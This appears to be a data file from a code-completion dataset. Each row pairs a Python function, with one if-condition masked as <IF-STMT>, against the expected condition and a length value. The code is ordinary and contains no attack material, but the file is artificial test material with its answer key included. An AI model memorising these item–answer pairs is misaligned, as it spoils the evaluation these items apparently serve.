4338,"def _count(self, element, count=True):<tab>if not isinstance(element, six.string_types):<tab><tab><IF-STMT><tab><tab><tab>return 1<tab>i = 0<tab>for child in self.children:<tab><tab># child is text content and element is also text content, then<tab><tab># make a simple ""text"" in ""text""<tab><tab>if isinstance(child, six.string_types):<tab><tab><tab>if isinstance(element, six.string_types):<tab><tab><tab><tab>if count:<tab><tab><tab><tab><tab>i += child.count(element)<tab><tab><tab><tab>elif element in child:<tab><tab><tab><tab><tab>return 1<tab><tab>else:<tab><tab><tab>i += child._count(element, count=count)<tab><tab><tab>if not count and i:<tab><tab><tab><tab>return i<tab>return i",if self == element :,196
4339,"def test_doctests(self):<tab>""""""Run tutorial doctests.""""""<tab>runner = doctest.DocTestRunner()<tab>failures = []<tab>for test in doctest.DocTestFinder().find(TutorialDocTestHolder):<tab><tab>failed, success = runner.run(test)<tab><tab><IF-STMT><tab><tab><tab>name = test.name<tab><tab><tab>assert name.startswith(""TutorialDocTestHolder.doctest_"")<tab><tab><tab>failures.append(name[30:])<tab><tab><tab># raise ValueError(""Tutorial doctest %s failed"" % test.name[30:])<tab>if failures:<tab><tab>raise ValueError(<tab><tab><tab>""%i Tutorial doctests failed: %s"" % (len(failures), "", "".join(failures))<tab><tab>)",if failed :,168
4340,"def send_preamble(self):<tab>""""""Transmit version/status/date/server, via self._write()""""""<tab>if self.origin_server:<tab><tab>if self.client_is_modern():<tab><tab><tab>self._write(""HTTP/%s %s\r\n"" % (self.http_version, self.status))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._write(""Date: %s\r\n"" % time.asctime(time.gmtime(time.time())))<tab><tab><tab>if self.server_software and not self.headers.has_key(""Server""):<tab><tab><tab><tab>self._write(""Server: %s\r\n"" % self.server_software)<tab>else:<tab><tab>self._write(""Status: %s\r\n"" % self.status)","if not self . headers . has_key ( ""Date"" ) :",199
4341,"def _verify_unique_measurement_keys(operations: Iterable[ops.Operation]):<tab>seen: Set[str] = set()<tab>for op in operations:<tab><tab>if isinstance(op.gate, ops.MeasurementGate):<tab><tab><tab>meas = op.gate<tab><tab><tab>key = protocols.measurement_key(meas)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(""Measurement key {} repeated"".format(key))<tab><tab><tab>seen.add(key)",if key in seen :,120
4342,"def test_dtype_basics(df):<tab>df[""new_virtual_column""] = df.x + 1<tab>for name in df.column_names:<tab><tab><IF-STMT><tab><tab><tab>assert df[name].values.dtype.kind in ""OSU""<tab><tab>else:<tab><tab><tab>assert df[name].values.dtype == df.dtype(df[name])",if df . dtype ( name ) == str_type :,99
4343,"def string_to_points(self, command, coord_string):<tab>numbers = string_to_numbers(coord_string)<tab>if command.upper() in [""H"", ""V""]:<tab><tab>i = {""H"": 0, ""V"": 1}[command.upper()]<tab><tab>xy = np.zeros((len(numbers), 2))<tab><tab>xy[:, i] = numbers<tab><tab><IF-STMT><tab><tab><tab>xy[:, 1 - i] = self.relative_point[1 - i]<tab>elif command.upper() == ""A"":<tab><tab>raise Exception(""Not implemented"")<tab>else:<tab><tab>xy = np.array(numbers).reshape((len(numbers) // 2, 2))<tab>result = np.zeros((xy.shape[0], self.dim))<tab>result[:, :2] = xy<tab>return result",if command . isupper ( ) :,193
4344,"def get_count(self, peek=False):<tab>if self.argument_supplied:<tab><tab>count = self.argument_value<tab><tab>if self.argument_negative:<tab><tab><tab>if count == 0:<tab><tab><tab><tab>count = -1<tab><tab><tab>else:<tab><tab><tab><tab>count = -count<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.argument_negative = False<tab><tab>if not peek:<tab><tab><tab>self.argument_supplied = False<tab>else:<tab><tab>count = 1<tab>return count",if not peek :,126
4345,"def toggleSchedule(self, **kwargs):<tab>schedules = cfg.schedules()<tab>line = kwargs.get(""line"")<tab>if line:<tab><tab>for i, schedule in enumerate(schedules):<tab><tab><tab><IF-STMT><tab><tab><tab><tab># Toggle the schedule<tab><tab><tab><tab>schedule_split = schedule.split()<tab><tab><tab><tab>schedule_split[0] = ""%d"" % (schedule_split[0] == ""0"")<tab><tab><tab><tab>schedules[i] = "" "".join(schedule_split)<tab><tab><tab><tab>break<tab><tab>cfg.schedules.set(schedules)<tab><tab>config.save_config()<tab><tab>sabnzbd.Scheduler.restart()<tab>raise Raiser(self.__root)",if schedule == line :,175
4346,"def test_sanity_no_long_entities(CorpusType: Type[ColumnCorpus]):<tab>corpus = CorpusType()<tab>longest_entity = []<tab>for sentence in corpus.get_all_sentences():<tab><tab>entities = sentence.get_spans(""ner"")<tab><tab>for entity in entities:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>longest_entity = [t.text for t in entity.tokens]<tab>assert len(longest_entity) < 10, "" "".join(longest_entity)",if len ( entity . tokens ) > len ( longest_entity ) :,123
4347,"def _set_helper(settings, path, value, data_type=None):<tab>path = _to_settings_path(path)<tab>method = settings.set<tab>if data_type is not None:<tab><tab>name = None<tab><tab>if data_type == bool:<tab><tab><tab>name = ""setBoolean""<tab><tab>elif data_type == float:<tab><tab><tab>name = ""setFloat""<tab><tab><IF-STMT><tab><tab><tab>name = ""setInt""<tab><tab>if name is not None:<tab><tab><tab>method = getattr(settings, name)<tab>method(path, value)<tab>settings.save()",elif data_type == int :,150
4348,"def scan_page(self, address_space, page_offset, fullpage=False):<tab>""""""Runs through patchers for a single page""""""<tab>if fullpage:<tab><tab>pagedata = address_space.read(page_offset, PAGESIZE)<tab>for patcher in self.patchers:<tab><tab>for offset, data in patcher.get_constraints():<tab><tab><tab>if fullpage:<tab><tab><tab><tab>testdata = pagedata[offset : offset + len(data)]<tab><tab><tab>else:<tab><tab><tab><tab>testdata = address_space.read(page_offset + offset, len(data))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>yield patcher",if data != testdata :,166
4349,"def accessSlice(self, node):<tab>self.visit(node.value)<tab>node.obj = self.getObj(node.value)<tab>self.access = _access.INPUT<tab>lower, upper = node.slice.lower, node.slice.upper<tab>if lower:<tab><tab>self.visit(lower)<tab>if upper:<tab><tab>self.visit(upper)<tab>if isinstance(node.obj, intbv):<tab><tab><IF-STMT><tab><tab><tab>self.require(lower, ""Expected leftmost index"")<tab><tab><tab>leftind = self.getVal(lower)<tab><tab><tab>if upper:<tab><tab><tab><tab>rightind = self.getVal(upper)<tab><tab><tab>else:<tab><tab><tab><tab>rightind = 0<tab><tab><tab>node.obj = node.obj[leftind:rightind]",if self . kind == _kind . DECLARATION :,198
4350,"def childConnectionLost(self, childFD):<tab>if self.state == 1:<tab><tab>self.fail(""got connectionLost(%d) during state 1"" % childFD)<tab><tab>return<tab>if self.state == 2:<tab><tab><IF-STMT><tab><tab><tab>self.fail(""got connectionLost(%d) (not 4) during state 2"" % childFD)<tab><tab><tab>return<tab><tab>self.state = 3<tab><tab>self.transport.closeChildFD(5)<tab><tab>return",if childFD != 4 :,122
4351,"def _find_matches(self, file, lookup, **kwargs):<tab>matches = []<tab>for format in lookup.values():<tab><tab><IF-STMT><tab><tab><tab>is_format, skwargs = format.sniffer_function(file, **kwargs)<tab><tab><tab>file.seek(0)<tab><tab><tab>if is_format:<tab><tab><tab><tab>matches.append((format.name, skwargs))<tab>return matches",if format . sniffer_function is not None :,108
4352,"def ParseCodeLines(tokens, case):<tab>""""""Parse uncommented code in a test case.""""""<tab>_, kind, item = tokens.peek()<tab><IF-STMT><tab><tab>raise ParseError(""Expected a line of code (got %r, %r)"" % (kind, item))<tab>code_lines = []<tab>while True:<tab><tab>_, kind, item = tokens.peek()<tab><tab>if kind != PLAIN_LINE:<tab><tab><tab>case[""code""] = ""\n"".join(code_lines) + ""\n""<tab><tab><tab>return<tab><tab>code_lines.append(item)<tab><tab>tokens.next()",if kind != PLAIN_LINE :,148
4353,"def _recursive_process(self):<tab>super(RecursiveObjectDownwardsVisitor, self)._recursive_process()<tab>while self._new_for_visit:<tab><tab>func_ea, arg_idx = self._new_for_visit.pop()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>cfunc = helper.decompile_function(func_ea)<tab><tab>if cfunc:<tab><tab><tab>assert arg_idx < len(cfunc.get_lvars()), ""Wrong argument at func {}"".format(<tab><tab><tab><tab>to_hex(func_ea)<tab><tab><tab>)<tab><tab><tab>obj = VariableObject(cfunc.get_lvars()[arg_idx], arg_idx)<tab><tab><tab>self.prepare_new_scan(cfunc, arg_idx, obj)<tab><tab><tab>self._recursive_process()",if helper . is_imported_ea ( func_ea ) :,199
4354,"def GetBoundingBoxMin(self):<tab>""""""Get the minimum bounding box.""""""<tab>x1, y1 = 10000, 10000<tab>x2, y2 = -10000, -10000<tab>for point in self._lineControlPoints:<tab><tab>if point[0] < x1:<tab><tab><tab>x1 = point[0]<tab><tab>if point[1] < y1:<tab><tab><tab>y1 = point[1]<tab><tab><IF-STMT><tab><tab><tab>x2 = point[0]<tab><tab>if point[1] > y2:<tab><tab><tab>y2 = point[1]<tab>return x2 - x1, y2 - y1",if point [ 0 ] > x2 :,158
4355,"def __init__(<tab>self,<tab>detail=None,<tab>headers=None,<tab>comment=None,<tab>body_template=None,<tab>location=None,<tab>add_slash=False,):<tab>super(_HTTPMove, self).__init__(<tab><tab>detail=detail, headers=headers, comment=comment, body_template=body_template<tab>)<tab>if location is not None:<tab><tab>self.location = location<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""You can only provide one of the arguments location "" ""and add_slash""<tab><tab><tab>)<tab>self.add_slash = add_slash",if add_slash :,155
4356,"def __str__(self, prefix="""", printElemNumber=0):<tab>res = """"<tab>cnt = 0<tab>for e in self.presence_response_:<tab><tab>elm = """"<tab><tab><IF-STMT><tab><tab><tab>elm = ""(%d)"" % cnt<tab><tab>res += prefix + (""presence_response%s <\n"" % elm)<tab><tab>res += e.__str__(prefix + ""  "", printElemNumber)<tab><tab>res += prefix + "">\n""<tab><tab>cnt += 1<tab>return res",if printElemNumber :,125
4357,"def _find_first_match(self, request):<tab>match_failed_reasons = []<tab>for i, match in enumerate(self._matches):<tab><tab>match_result, reason = match.matches(request)<tab><tab><IF-STMT><tab><tab><tab>return match, match_failed_reasons<tab><tab>else:<tab><tab><tab>match_failed_reasons.append(reason)<tab>return None, match_failed_reasons",if match_result :,99
4358,"def index(self, req, volume_id):<tab>req_version = req.api_version_request<tab>metadata = super(Controller, self).index(req, volume_id)<tab>if req_version.matches(mv.ETAGS):<tab><tab>data = jsonutils.dumps(metadata)<tab><tab><IF-STMT><tab><tab><tab>data = data.encode(""utf-8"")<tab><tab>resp = webob.Response()<tab><tab>resp.headers[""Etag""] = hashlib.md5(data).hexdigest()<tab><tab>resp.body = data<tab><tab>return resp<tab>return metadata",if six . PY3 :,140
4359,"def init(self):<tab>""""""Called after document is loaded.""""""<tab># Create div to put dynamic CSS assets in<tab>self.asset_node = window.document.createElement(""div"")<tab>self.asset_node.id = ""Flexx asset container""<tab>window.document.body.appendChild(self.asset_node)<tab>if self.is_exported:<tab><tab>if self.is_notebook:<tab><tab><tab>print(""Flexx: I am in an exported notebook!"")<tab><tab>else:<tab><tab><tab>print(""Flexx: I am in an exported app!"")<tab><tab><tab>self.run_exported_app()<tab>else:<tab><tab>print(""Flexx: Initializing"")<tab><tab><IF-STMT><tab><tab><tab>self._remove_querystring()<tab><tab>self.init_logging()",if not self . is_notebook :,188
4360,"def get_default_person(self):<tab>""""""Return the default Person of the database.""""""<tab>person_handle = self.get_default_handle()<tab>if person_handle:<tab><tab>person = self.get_person_from_handle(person_handle)<tab><tab>if person:<tab><tab><tab>return person<tab><tab><IF-STMT><tab><tab><tab># Start transaction<tab><tab><tab>with BSDDBTxn(self.env, self.metadata) as txn:<tab><tab><tab><tab>txn.put(b""default"", None)<tab><tab><tab>return None<tab>else:<tab><tab>return None",elif ( self . metadata ) and ( not self . readonly ) :,149
4361,def reader():<tab>async with read:<tab><tab>await wait_all_tasks_blocked()<tab><tab>total_received = 0<tab><tab>while True:<tab><tab><tab># 5000 is chosen because it doesn't evenly divide 2**20<tab><tab><tab>received = len(await read.receive_some(5000))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>total_received += received<tab><tab>assert total_received == count * replicas,if not received :,104
4362,"def array_module(a):<tab>if isinstance(a, np.ndarray):<tab><tab>return np<tab>else:<tab><tab>from pyopencl.array import Array<tab><tab><IF-STMT><tab><tab><tab>return _CLFakeArrayModule(a.queue)<tab><tab>else:<tab><tab><tab>raise TypeError(""array type not understood: %s"" % type(a))","if isinstance ( a , Array ) :",89
4363,"def __str__(self):<tab>path = super(XPathExpr, self).__str__()<tab>if self.textnode:<tab><tab><IF-STMT><tab><tab><tab>path = ""text()""<tab><tab>elif path.endswith(""::*/*""):<tab><tab><tab>path = path[:-3] + ""text()""<tab><tab>else:<tab><tab><tab>path += ""/text()""<tab>if self.attribute is not None:<tab><tab>if path.endswith(""::*/*""):<tab><tab><tab>path = path[:-2]<tab><tab>path += ""/@%s"" % self.attribute<tab>return path","if path == ""*"" :",132
4364,"def update(self):<tab>if self.saved():<tab><tab>rgns = self.view.get_regions(self.region_key)<tab><tab><IF-STMT><tab><tab><tab>rgn = Region.from_region(self.view, rgns[0], self.region_key)<tab><tab><tab>self.start = rgn.start<tab><tab><tab>self.end = rgn.end",if rgns :,92
4365,"def PrintServerName(data, entries):<tab>if entries > 0:<tab><tab>entrieslen = 26 * entries<tab><tab>chunks, chunk_size = len(data[:entrieslen]), entrieslen / entries<tab><tab>ServerName = [data[i : i + chunk_size] for i in range(0, chunks, chunk_size)]<tab><tab>l = []<tab><tab>for x in ServerName:<tab><tab><tab>FP = WorkstationFingerPrint(x[16:18])<tab><tab><tab>Name = x[:16].replace(""\x00"", """")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>l.append(Name + "" (%s)"" % FP)<tab><tab><tab>else:<tab><tab><tab><tab>l.append(Name)<tab><tab>return l<tab>return None",if FP :,177
4366,"def add_lookup(self, name_type, pyname, jsname, depth=-1):<tab>jsname = self.jsname(name_type, jsname)<tab>if self.local_prefix is not None:<tab><tab><IF-STMT><tab><tab><tab>jsname = self.jsname(name_type, ""%s.%s"" % (self.local_prefix, jsname))<tab>if self.lookup_stack[depth].has_key(pyname):<tab><tab>name_type = self.lookup_stack[depth][pyname][0]<tab>if self.module_name != ""pyjslib"" or pyname != ""int"":<tab><tab>self.lookup_stack[depth][pyname] = (name_type, pyname, jsname)<tab>return jsname",if jsname . find ( self . local_prefix ) != 0 :,191
4367,"def ensure_echo_on():<tab>if termios:<tab><tab>fd = sys.stdin<tab><tab><IF-STMT><tab><tab><tab>attr_list = termios.tcgetattr(fd)<tab><tab><tab>if not attr_list[3] & termios.ECHO:<tab><tab><tab><tab>attr_list[3] |= termios.ECHO<tab><tab><tab><tab>if hasattr(signal, ""SIGTTOU""):<tab><tab><tab><tab><tab>old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>old_handler = None<tab><tab><tab><tab>termios.tcsetattr(fd, termios.TCSANOW, attr_list)<tab><tab><tab><tab>if old_handler is not None:<tab><tab><tab><tab><tab>signal.signal(signal.SIGTTOU, old_handler)",if fd . isatty ( ) :,197
4368,"def get_query_results(user, query_id, bring_from_cache):<tab>query = _load_query(user, query_id)<tab>if bring_from_cache:<tab><tab><IF-STMT><tab><tab><tab>results = query.latest_query_data.data<tab><tab>else:<tab><tab><tab>raise Exception(""No cached result available for query {}."".format(query.id))<tab>else:<tab><tab>results, error = query.data_source.query_runner.run_query(<tab><tab><tab>query.query_text, user<tab><tab>)<tab><tab>if error:<tab><tab><tab>raise Exception(""Failed loading results for query id {}."".format(query.id))<tab><tab>else:<tab><tab><tab>results = json_loads(results)<tab>return results",if query . latest_query_data_id is not None :,188
4369,"def on_tag_added_to_page(self, o, row, pagerow):<tab>self.flush_cache()<tab>if row[""name""] in self.tags and self._matches_all(pagerow[""id""]):<tab><tab># Without the new tag it did not match, so add to view<tab><tab># Find top level entry - ignore possible deeper matches<tab><tab>for treepath in self._find_all_pages(pagerow[""name""]):<tab><tab><tab>if len(treepath) == 1:<tab><tab><tab><tab>treeiter = self.get_iter(treepath)  # not mytreeiter !<tab><tab><tab><tab>self.emit(""row-inserted"", treepath, treeiter)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self._emit_children_inserted(pagerow[""id""], treepath)","if pagerow [ ""n_children"" ] > 0 :",196
4370,"def _is_subnet_of(a, b):<tab>try:<tab><tab># Always false if one is v4 and the other is v6.<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(f""{a} and {b} are not of the same version"")<tab><tab>return (<tab><tab><tab>b.network_address <= a.network_address<tab><tab><tab>and b.broadcast_address >= a.broadcast_address<tab><tab>)<tab>except AttributeError:<tab><tab>raise TypeError(f""Unable to test subnet containment "" f""between {a} and {b}"")",if a . _version != b . _version :,140
4371,"def consume(d={}):<tab>""""""Add attribute list to the dictionary 'd' and reset the list.""""""<tab>if AttributeList.attrs:<tab><tab>d.update(AttributeList.attrs)<tab><tab>AttributeList.attrs = {}<tab><tab># Generate option attributes.<tab><tab><IF-STMT><tab><tab><tab>options = parse_options(d[""options""], (), ""illegal option name"")<tab><tab><tab>for option in options:<tab><tab><tab><tab>d[option + ""-option""] = """"","if ""options"" in d :",113
4372,"def tearDown(self):<tab># make sure all of the subprocesses are dead<tab>for pidfile in self.pidfiles:<tab><tab>if not os.path.exists(pidfile):<tab><tab><tab>continue<tab><tab>with open(pidfile) as f:<tab><tab><tab>pid = f.read()<tab><tab>if not pid:<tab><tab><tab>return<tab><tab>pid = int(pid)<tab><tab>try:<tab><tab><tab>os.kill(pid, signal.SIGKILL)<tab><tab>except OSError:<tab><tab><tab>pass<tab># and clean up leftover pidfiles<tab>for pidfile in self.pidfiles:<tab><tab><IF-STMT><tab><tab><tab>os.unlink(pidfile)<tab>self.tearDownBasedir()",if os . path . exists ( pidfile ) :,167
4373,"def sort(self, items):<tab>slow_sorts = []<tab>switch_slow = False<tab>for sort in reversed(self.sorts):<tab><tab>if switch_slow:<tab><tab><tab>slow_sorts.append(sort)<tab><tab><IF-STMT><tab><tab><tab>switch_slow = True<tab><tab><tab>slow_sorts.append(sort)<tab><tab>else:<tab><tab><tab>pass<tab>for sort in slow_sorts:<tab><tab>items = sort.sort(items)<tab>return items",elif sort . order_clause ( ) is None :,121
4374,"def shortcut(input, ch_out, stride):<tab>ch_in = input.shape[1]<tab>if ch_in != ch_out:<tab><tab><IF-STMT><tab><tab><tab>filter_size = 1<tab><tab>else:<tab><tab><tab>filter_size = 3<tab><tab>return conv_bn_layer(input, ch_out, filter_size, stride)<tab>else:<tab><tab>return input",if stride == 1 :,97
4375,"def detab(self, text):<tab>""""""Remove a tab from the front of each line of the given text.""""""<tab>newtext = []<tab>lines = text.split(""\n"")<tab>for line in lines:<tab><tab>if line.startswith("" "" * self.tab_length):<tab><tab><tab>newtext.append(line[self.tab_length :])<tab><tab><IF-STMT><tab><tab><tab>newtext.append("""")<tab><tab>else:<tab><tab><tab>break<tab>return ""\n"".join(newtext), ""\n"".join(lines[len(newtext) :])",elif not line . strip ( ) :,134
4376,"def construct_instances(self, row, keys=None):<tab>collected_models = {}<tab>for i, (key, constructor, attr, conv) in enumerate(self.column_map):<tab><tab>if keys is not None and key not in keys:<tab><tab><tab>continue<tab><tab>value = row[i]<tab><tab>if key not in collected_models:<tab><tab><tab>collected_models[key] = constructor()<tab><tab>instance = collected_models[key]<tab><tab><IF-STMT><tab><tab><tab>attr = self.cursor.description[i][0]<tab><tab>if conv is not None:<tab><tab><tab>value = conv(value)<tab><tab>setattr(instance, attr, value)<tab>return collected_models",if attr is None :,167
4377,"def stop_loggers(self):<tab>super(NetconsoleHost, self).stop_loggers()<tab>if self.__logger:<tab><tab>utils.nuke_subprocess(self.__logger)<tab><tab>self.__logger = None<tab><tab><IF-STMT><tab><tab><tab>self.job.warning_loggers.discard(self.__warning_stream)<tab><tab>self.__warning_stream.close()",if self . job :,93
4378,"def get_template_context(node, context, context_lines=3):<tab>line, source_lines, name = get_template_source_from_exception_info(node, context)<tab>debug_context = []<tab>start = max(1, line - context_lines)<tab>end = line + 1 + context_lines<tab>for line_num, content in source_lines:<tab><tab><IF-STMT><tab><tab><tab>debug_context.append(<tab><tab><tab><tab>{""num"": line_num, ""content"": content, ""highlight"": (line_num == line)}<tab><tab><tab>)<tab>return {""name"": name, ""context"": debug_context}",if start <= line_num <= end :,158
4379,"def arg_names(self, lineage, command_name, positional_arg=False):<tab>parent = ""."".join(lineage)<tab>arg_names = self.index[""arg_names""].get(parent, {}).get(command_name, [])<tab>filtered_arg_names = []<tab>for arg_name in arg_names:<tab><tab>arg_data = self.get_argument_data(lineage, command_name, arg_name)<tab><tab><IF-STMT><tab><tab><tab>filtered_arg_names.append(arg_name)<tab>return filtered_arg_names",if arg_data . positional_arg == positional_arg :,140
4380,"def attributive(adjective, gender=MALE):<tab>w = adjective.lower()<tab># normal => normales<tab>if PLURAL in gender and not is_vowel(w[-1:]):<tab><tab>return w + ""es""<tab># el chico inteligente => los chicos inteligentes<tab>if PLURAL in gender and w.endswith((""a"", ""e"")):<tab><tab>return w + ""s""<tab># el chico alto => los chicos altos<tab>if w.endswith(""o""):<tab><tab><IF-STMT><tab><tab><tab>return w[:-1] + ""as""<tab><tab>if FEMININE in gender:<tab><tab><tab>return w[:-1] + ""a""<tab><tab>if PLURAL in gender:<tab><tab><tab>return w + ""s""<tab>return w",if FEMININE in gender and PLURAL in gender :,197
4381,"def _get_disk_size(cls, path, ignored=None):<tab>if ignored is None:<tab><tab>ignored = []<tab>if path in ignored:<tab><tab>return 0<tab>total = 0<tab>for entry in scandir(path):<tab><tab>if entry.is_dir():<tab><tab><tab>total += cls._get_disk_size(entry.path, ignored=ignored)<tab><tab><IF-STMT><tab><tab><tab>total += entry.stat().st_size<tab>return total",elif entry . is_file ( ) :,117
4382,"def validateHeaders(self):<tab>if ""Cookie"" in self.headers:<tab><tab>for session in self.factory.authenticated_sessions:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return WebSocketProtocol.validateHeaders(self)<tab>return False","if ""TWISTED_SESSION="" + session . uid in self . headers [ ""Cookie"" ] :",74
4383,"def _format_privilege_data(self, data):<tab>for key in [""spcacl""]:<tab><tab>if key in data and data[key] is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data[key][""added""] = parse_priv_to_db(data[key][""added""], self.acl)<tab><tab><tab>if ""changed"" in data[key]:<tab><tab><tab><tab>data[key][""changed""] = parse_priv_to_db(data[key][""changed""], self.acl)<tab><tab><tab>if ""deleted"" in data[key]:<tab><tab><tab><tab>data[key][""deleted""] = parse_priv_to_db(data[key][""deleted""], self.acl)","if ""added"" in data [ key ] :",168
4384,"def show_text(text):<tab>print(_stash.text_color(""="" * 20, ""yellow""))<tab>lines = text.split(""\n"")<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>print(""\n"".join(lines))<tab><tab><tab>return<tab><tab>else:<tab><tab><tab>print(""\n"".join(lines[:100]))<tab><tab><tab>lines = lines[100:]<tab><tab><tab>prompt = _stash.text_color(""(Press Return to continue)"", ""yellow"")<tab><tab><tab>raw_input(prompt)<tab>print(""\n"")",if len ( lines ) < 100 :,135
4385,"def run(self):<tab>TimeInspector.set_time_mark()<tab>for tuner_index, tuner_config in enumerate(self.pipeline_config):<tab><tab>tuner = self.init_tuner(tuner_index, tuner_config)<tab><tab>tuner.tune()<tab><tab><IF-STMT><tab><tab><tab>self.global_best_res = tuner.best_res<tab><tab><tab>self.global_best_params = tuner.best_params<tab><tab><tab>self.best_tuner_index = tuner_index<tab>TimeInspector.log_cost_time(""Finished tuner pipeline."")<tab>self.save_tuner_exp_info()",if self . global_best_res is None or self . global_best_res > tuner . best_res :,194
4386,"def OnEvent(self, propGrid, aProperty, ctrl, event):<tab>if event.GetEventType() == wx.wxEVT_BUTTON:<tab><tab>buttons = propGrid.GetEditorControlSecondary()<tab><tab>if event.GetId() == buttons.GetButtonId(0):<tab><tab><tab># Do something when the first button is pressed<tab><tab><tab># Return true if the action modified the value in editor.<tab><tab><tab>...<tab><tab><IF-STMT><tab><tab><tab># Do something when the second button is pressed<tab><tab><tab>...<tab><tab>if event.GetId() == buttons.GetButtonId(2):<tab><tab><tab># Do something when the third button is pressed<tab><tab><tab>...<tab>return wx.propgrid.PGTextCtrlEditor.OnEvent(propGrid, aProperty, ctrl, event)",if event . GetId ( ) == buttons . GetButtonId ( 1 ) :,195
4387,"def run(self, edit):<tab>view = self.view<tab>for sel in view.sel():<tab><tab>if not self.is_valid_scope(sel):<tab><tab><tab>continue<tab><tab>region = view.extract_scope(sel.end())<tab><tab>content = self.extract_content(region)<tab><tab>resolver, content = self.resolve(content)<tab><tab><IF-STMT><tab><tab><tab>sublime.error_message(""Could not resolve link:\n%s"" % content)<tab><tab><tab>continue<tab><tab>resolver.execute(content)",if content is None :,131
4388,"def __init__(self, aList):<tab>for element in aList:<tab><tab>if len(element) > 0:<tab><tab><tab>if element.tag == element[0].tag:<tab><tab><tab><tab>self.append(ListParser(element))<tab><tab><tab>else:<tab><tab><tab><tab>self.append(DictParser(element))<tab><tab><IF-STMT><tab><tab><tab>text = element.text.strip()<tab><tab><tab>if text:<tab><tab><tab><tab>self.append(text)",elif element . text :,116
4389,"def put(self, can_split=False):<tab>for node in (self.nodes)[:1]:<tab><tab><IF-STMT><tab><tab><tab>node.put(can_split=can_split)<tab>for node in (self.nodes)[1:]:<tab><tab>self.line_more(SLICE_COLON, can_split_after=True)<tab><tab>if self.has_value(node):<tab><tab><tab>node.put(can_split=can_split)<tab>return self",if self . has_value ( node ) :,118
4390,"def process_return_exits(self, exits):<tab>""""""Add arcs due to jumps from `exits` being returns.""""""<tab>for block in self.nearest_blocks():<tab><tab>if isinstance(block, TryBlock) and block.final_start is not None:<tab><tab><tab>block.return_from.update(exits)<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>for xit in exits:<tab><tab><tab><tab>self.add_arc(<tab><tab><tab><tab><tab>xit.lineno,<tab><tab><tab><tab><tab>-block.start,<tab><tab><tab><tab><tab>xit.cause,<tab><tab><tab><tab><tab>""didn't return from function {!r}"".format(block.name),<tab><tab><tab><tab>)<tab><tab><tab>break","elif isinstance ( block , FunctionBlock ) :",179
4391,"def find_commands(management_dir):<tab># Modified version of function from django/core/management/__init__.py.<tab>command_dir = os.path.join(management_dir, ""commands"")<tab>commands = []<tab>try:<tab><tab>for f in os.listdir(command_dir):<tab><tab><tab>if f.startswith(""_""):<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>commands.append(f[:-3])<tab><tab><tab>elif f.endswith("".pyc"") and f[:-4] not in commands:<tab><tab><tab><tab>commands.append(f[:-4])<tab>except OSError:<tab><tab>pass<tab>return commands","elif f . endswith ( "".py"" ) and f [ : - 3 ] not in commands :",164
4392,"def split_path_info(path):<tab># suitable for splitting an already-unquoted-already-decoded (unicode)<tab># path value<tab>path = path.strip(""/"")<tab>clean = []<tab>for segment in path.split(""/""):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif segment == "".."":<tab><tab><tab>if clean:<tab><tab><tab><tab>del clean[-1]<tab><tab>else:<tab><tab><tab>clean.append(segment)<tab>return tuple(clean)","if not segment or segment == ""."" :",115
4393,"def __init__(self, source_definition, **kw):<tab>super(RekallEFilterArtifacts, self).__init__(source_definition, **kw)<tab>for column in self.fields:<tab><tab><IF-STMT><tab><tab><tab>raise errors.FormatError(<tab><tab><tab><tab>u""Field definition should have both name and type.""<tab><tab><tab>)<tab><tab>mapped_type = column[""type""]<tab><tab>if mapped_type not in self.allowed_types:<tab><tab><tab>raise errors.FormatError(u""Unsupported type %s."" % mapped_type)","if ""name"" not in column or ""type"" not in column :",143
4394,"def _name(self, sender, short=True, full_email=False):<tab>words = re.sub('[""<>]', """", sender).split()<tab>nomail = [w for w in words if not ""@"" in w]<tab>if nomail:<tab><tab>if short:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return nomail[1]<tab><tab><tab>return nomail[0]<tab><tab>return "" "".join(nomail)<tab>elif words:<tab><tab>if not full_email:<tab><tab><tab>return words[0].split(""@"", 1)[0]<tab><tab>return words[0]<tab>return ""(nobody)""",if len ( nomail ) > 1 and nomail [ 0 ] . lower ( ) in self . _NAME_TITLES :,168
4395,"def _get_consuming_layers(self, check_layer):<tab>""""""Returns all the layers which are out nodes from the layer.""""""<tab>consuming_layers = []<tab>for layer in self._config[""layers""]:<tab><tab>for inbound_node in layer[""inbound_nodes""]:<tab><tab><tab>for connection_info in inbound_node:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>consuming_layers.append(layer)<tab>return consuming_layers","if connection_info [ 0 ] == check_layer [ ""config"" ] [ ""name"" ] :",126
4396,"def _check_feasible_fuse(self, model):<tab>if not self.modules_to_fuse:<tab><tab>return False<tab>for group in self.modules_to_fuse:<tab><tab><IF-STMT><tab><tab><tab>raise MisconfigurationException(<tab><tab><tab><tab>f""You have requested to fuse {group} but one or more of them is not your model attributes""<tab><tab><tab>)<tab>return True","if not all ( _recursive_hasattr ( model , m ) for m in group ) :",109
4397,"def cancel_loan_repayment_entry(self):<tab>for loan in self.loans:<tab><tab><IF-STMT><tab><tab><tab>repayment_entry = frappe.get_doc(<tab><tab><tab><tab>""Loan Repayment"", loan.loan_repayment_entry<tab><tab><tab>)<tab><tab><tab>repayment_entry.cancel()",if loan . loan_repayment_entry :,94
